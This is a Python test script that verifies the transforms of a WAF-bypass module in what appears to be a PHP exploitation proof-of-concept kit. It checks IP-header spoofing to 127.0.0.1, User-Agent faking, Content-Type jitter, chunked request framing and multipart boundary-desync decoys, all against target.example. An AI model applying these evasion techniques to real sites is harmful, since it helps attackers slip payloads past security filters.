#!/usr/bin/env python3 -I
"""Transform verifier for waf_bypass.py (offline; no lab needed).

Asserts header spoofing/merge, Content-Type case+charset jitter (boundary and
media type preserved for PHP), and the chunked Transfer-Encoding wire framing
(round-trips through dechunk; no Content-Length; spoof headers carried).

    python3 -I poc/primitives/encode/verify_waf_bypass.py
"""
from __future__ import annotations

import os
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common import http_raw                                   # noqa: E402
from primitives.encode import waf_bypass as W                 # noqa: E402


class Args:
    waf_bypass = waf_header = waf_ua = waf_xff = None
    waf_ct_jitter = waf_chunked = False
    waf_chunk_size = 1024


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True
    CT = "multipart/form-data; boundary=----P2S"

    print("## default bundle (--waf-bypass): UA + XFF spoof + ct-jitter, chunked off")
    a = Args()
    a.waf_bypass = True
    p = W.WafProfile.from_args(a)
    ok &= check("enabled", p.enabled)
    ok &= check("chunked stays opt-in (off)", not p.chunked)
    h = p.apply_headers({"Content-Type": CT, "Content-Length": "10"})
    ok &= check("User-Agent set", "Mozilla/5.0" in h.get("User-Agent", ""))
    ok &= check("X-Forwarded-For spoofed", h.get("X-Forwarded-For") == "127.0.0.1")
    ok &= check("X-Real-IP spoofed", h.get("X-Real-IP") == "127.0.0.1")

    print("## Content-Type jitter preserves media type (case-insensitively) + boundary")
    jct = h["Content-Type"]
    head = jct.split(";", 1)[0].strip()
    ok &= check("media type preserved under case fold", head.lower() == "multipart/form-data")
    ok &= check("boundary=----P2S preserved verbatim", "boundary=----P2S" in jct)
    ok &= check("charset appended", "charset=" in jct.lower())

    print("## custom --waf-header wins; explicit --waf-ua/--waf-xff override bundle")
    a2 = Args()
    a2.waf_bypass = True
    a2.waf_header = ["X-Forwarded-For: 10.9.8.7", "X-Custom: zz"]
    a2.waf_ua = "curl/8.0"
    p2 = W.WafProfile.from_args(a2)
    h2 = p2.apply_headers({"Content-Type": CT})
    ok &= check("custom header overrides spoof XFF", h2.get("X-Forwarded-For") == "10.9.8.7")
    ok &= check("extra custom header present", h2.get("X-Custom") == "zz")
    ok &= check("explicit UA honored", h2.get("User-Agent") == "curl/8.0")

    print("## disabled profile returns the transport unchanged (no overhead)")
    sentinel = object()
    p0 = W.WafProfile()
    ok &= check("not enabled with no flags", not p0.enabled)
    ok &= check("wrap_http is identity when disabled", p0.wrap_http(sentinel) is sentinel)
    ok &= check("wrap_http_full is identity when disabled", p0.wrap_http_full(sentinel) is sentinel)

    print("## chunked wire framing: round-trips via dechunk, no Content-Length")
    body = (b"A" * 1000) + (b"B" * 537)        # spans multiple 512B chunks
    host, port, wire = W.build_chunked_wire(
        "http://target.example:8080/poc.php",
        body,
        {"Content-Type": CT, "Content-Length": str(len(body)),
         "X-Forwarded-For": "127.0.0.1"},
        chunk_size=512)
    ok &= check("host parsed", host == "target.example")
    ok &= check("port parsed", port == 8080)
    hdr_blob, _, body_blob = wire.partition(b"\r\n\r\n")
    hdr_txt = hdr_blob.decode("latin1")
    ok &= check("request line + path", hdr_txt.startswith("POST /poc.php HTTP/1.1"))
    ok &= check("Host includes port", "Host: target.example:8080" in hdr_txt)
    ok &= check("Transfer-Encoding: chunked present", "Transfer-Encoding: chunked" in hdr_txt)
    ok &= check("no Content-Length header", "content-length" not in hdr_txt.lower())
    ok &= check("spoof header carried into wire", "X-Forwarded-For: 127.0.0.1" in hdr_txt)
    ok &= check("body dechunks back to the original", http_raw.dechunk(body_blob) == body)
    ok &= check("wire terminates with 0-chunk", wire.endswith(b"0\r\n\r\n"))

    print("## boundary-desync forms keep the real boundary (PHP first-wins) + decoy last")
    rng = __import__("random").Random(1)
    for form in W.BOUNDARY_DESYNC_FORMS:
        out = W.make_desync_ct(CT, form, rng)
        first = W.extract_boundary(out)          # PHP's first-wins view
        ok &= check("%-6s keeps real boundary first" % form, first == "----P2S")
        ok &= check("%-6s media type intact" % form, "multipart/form-data" in out.lower())
        if form in ("dup", "combo"):
            ok &= check("%-6s decoy is the LAST boundary param" % form,
                        out.rstrip().rsplit("boundary", 1)[-1].lstrip(" =").rstrip('"') != "----P2S")
        if form in ("quote", "combo"):
            ok &= check('%-6s emits a quoted boundary' % form, 'boundary="----P2S"' in out
                        or 'boundary ="----P2S"' in out)

    print("## boundary-desync wires through the profile onto a multipart Content-Type")
    a3 = Args()
    a3.waf_boundary_desync = "dup"
    p3 = W.WafProfile.from_args(a3)
    ok &= check("profile enabled by desync alone", p3.enabled)
    h3 = p3.apply_headers({"Content-Type": CT})
    ok &= check("desync applied to CT", W.extract_boundary(h3["Content-Type"]) == "----P2S"
                and h3["Content-Type"].count("boundary") == 2)

    print("## parse_response dechunks a chunked reply")
    resp = (b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
            b"5\r\nhello\r\n6\r\n world\r\n0\r\n\r\n")
    st, hdrs, rbody = W.parse_response(resp)
    ok &= check("status parsed = 200", st == 200)
    ok &= check("response body dechunked", rbody == b"hello world")
    ok &= check("empty response -> (None,{},b'')", W.parse_response(b"") == (None, {}, b""))

    print("\n==== verify_waf_bypass: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
